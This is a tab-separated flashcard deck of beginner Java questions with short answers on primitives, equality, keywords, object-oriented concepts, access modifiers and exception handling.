# Java Beginner Questions
# Format: Front[TAB]Back

What is the difference between `==` and `.equals()` in Java?	`==` compares object references (memory addresses); `.equals()` compares object content/values.
What are the 8 primitive types in Java?	byte, short, int, long, float, double, char, boolean
What is autoboxing in Java?	Automatic conversion between a primitive type and its corresponding wrapper class (e.g., int → Integer).
What is the default value of an int field in a class?	0
What is the default value of a boolean field in a class?	false
What is the default value of an object reference field in a class?	null
What does the `final` keyword mean on a variable?	The variable can only be assigned once; its reference cannot be changed after initialization.
What does the `static` keyword mean on a method?	The method belongs to the class itself, not to any instance; it can be called without creating an object.
What is a varargs parameter?	A method parameter that accepts a variable number of arguments, declared with `...` (e.g., `void log(String... msgs)`).
What is the difference between `break` and `continue`?	`break` exits the enclosing loop entirely; `continue` skips the rest of the current iteration and moves to the next.
What is a ternary operator?	A shorthand for if-else: `condition ? valueIfTrue : valueIfFalse`
What is string interning in Java?	The process of storing only one copy of each distinct string value in the string pool, allowing reference comparison with `==`.
What is the `instanceof` operator?	A keyword that tests whether an object is an instance of a given class or interface, returning a boolean.
What does `System.out.println()` do?	Prints the given argument to standard output followed by a newline character.
What is the difference between `int` and `Integer`?	`int` is a primitive type; `Integer` is its wrapper class (an object) that can be null and used in collections.
What are the four pillars of OOP?	Encapsulation, Inheritance, Polymorphism, Abstraction
What is encapsulation?	Bundling data (fields) and methods that operate on that data into a single unit (class), and restricting direct access to some components.
What is the difference between an abstract class and an interface?	An abstract class can have state and concrete methods; an interface defines a contract with (default) methods but no instance state.
What does `@Override` do?	It is an annotation that indicates a method is overriding a method from a superclass or implementing an interface method. The compiler will flag an error if no such method exists.
What is method overloading?	Defining multiple methods with the same name but different parameter lists within the same class.
What is method overriding?	Providing a specific implementation of a method in a subclass that already exists in a superclass, with the same signature.
What is a constructor?	A special method used to initialize a new object. It has the same name as the class and no return type.
What is the `super` keyword?	A reference to the immediate parent class. Used to call the parent constructor (`super()`) or access parent methods/fields.
What is the `this` keyword?	A reference to the current object instance. Used to disambiguate fields from parameters or to call another constructor.
What is polymorphism?	The ability of an object to take on many forms; a superclass reference can hold a subclass object and dispatch methods at runtime (dynamic dispatch).
What is an interface default method (Java 8+)?	A method declared inside an interface with the `default` keyword that provides a default implementation, so existing implementations don't break.
What is the difference between `public`, `protected`, `package-private`, and `private`?	`public`: accessible everywhere; `protected`: accessible in the same package and subclasses; package-private (no modifier): same package only; `private`: only within the declaring class.
What is a static nested class vs. an inner class?	A static nested class does not hold a reference to the outer class instance; an inner (non-static) class does.
What is an enum in Java?	A special class that represents a group of named constants. Enums can have fields, constructors, and methods.
What is the Liskov Substitution Principle?	Objects of a subclass should be substitutable for objects of the superclass without altering the correctness of the program.
What is the difference between a checked and an unchecked exception in Java?	Checked exceptions are subclasses of `Exception` (but not `RuntimeException`) and must be declared with `throws` or caught at compile time. Examples: `IOException`, `SQLException`. Unchecked exceptions are subclasses of `RuntimeException` (or `Error`) and do NOT need to be declared or caught. Examples: `NullPointerException`, `IllegalArgumentException`, `ArrayIndexOutOfBoundsException`. The rationale: checked exceptions represent recoverable conditions the caller should handle; unchecked represent programming mistakes.
What is the exception class hierarchy in Java?	`Throwable` is the root. Two direct subclasses: `Error` (JVM-level problems like `OutOfMemoryError`, `StackOverflowError` — normally not caught) and `Exception` (application-level problems). `Exception` splits into checked exceptions (direct subclasses like `IOException`) and unchecked exceptions (subclasses of `RuntimeException` like `NullPointerException`).
What does `try / catch / finally` guarantee?	The `finally` block ALWAYS executes after the `try` block completes — whether normally, via a caught exception, or an uncaught exception. The only exceptions are `System.exit()` calls or the JVM crashing. Use `finally` for cleanup (closing resources). Note: if `finally` contains a `return` statement, it suppresses any exception that was propagating.
What is the difference between `throw` and `throws`?	`throw` is a statement that actually throws an exception object: `throw new IllegalArgumentException("bad input")`. `throws` is a method declaration keyword that advertises which checked exceptions a method may propagate: `void readFile() throws IOException`. A method can `throws` multiple exceptions: `throws IOException, SQLException`.
